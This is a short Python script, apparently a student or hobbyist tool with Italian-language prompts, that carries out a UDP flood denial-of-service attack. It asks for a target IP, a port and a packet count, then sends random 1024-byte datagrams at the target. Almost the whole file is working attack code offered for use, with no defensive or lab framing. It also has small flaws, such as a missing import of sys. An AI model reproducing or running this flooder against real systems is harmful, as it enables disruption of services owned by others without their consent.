# Dos Udp Flood

import socket
import random
import ipaddress

def udp_flood(target_ip, target_port, num_packets):
    try: 
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = bytearray(random.getrandbits(8)for _ in range(1024))

        for _ in range(num_packets): 
            udp_socket.sendto(data, (target_ip, target_port))

        print("attacco UDP flood completato con successo")
    except Exception as e:
        print("Si è erificato un errore", e)
    finally: 
         if udp_socket: 
            udp_socket.close()
    
if __name__ == "__main__":
    try:
        target_ip = input("Inserisci IP target: ").strip()
        target_port = int(input("Inserisci la porta target: ").strip())

        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            print("Errore IP non valido")
            sys.exit(1)

        if not (1 <= target_port <= 65535):
            print("Errore: porta sbagliata")
            sys.exit(1)

        num_packets = int(input("Inserisci il numero di pacchetti da inviare: ").strip())

        if num_packets <= 0:
            print("Errore: il numero di pacchetti deve essere maggiore di 0")
            sys.exit(1)

        udp_flood(target_ip, target_port, num_packets)

    except ValueError:
        print("Errore: input non numerico")
